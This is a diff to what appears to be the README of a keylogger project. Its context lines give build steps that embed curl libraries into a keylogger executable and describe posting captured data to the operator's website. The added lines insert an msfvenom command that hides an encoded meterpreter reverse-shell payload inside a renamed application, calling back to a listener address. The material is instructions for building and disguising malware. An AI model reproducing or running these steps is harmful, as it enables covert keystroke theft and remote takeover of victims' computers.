@@ -18,7 +18,11 @@
 * <code> cd build\dllToExe </code>
 * <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
 * Launch <NameKeylogger.exe>
-
+  
+  
+ ## Payload metasploit
+ 
+ <code> msfvenom -x .\JohnnyLounch.exe -p windows/meterpreter_reverse_tcp -f exe -e x86/shikata_ga_nai lhost=192.168.1.80 lport=4444  -o JohnnyLounchMeterpreter2.exe </code>
 
 ### $_POST['text'] matching request curl for receive data on your website.
 ### You have an example in web directory
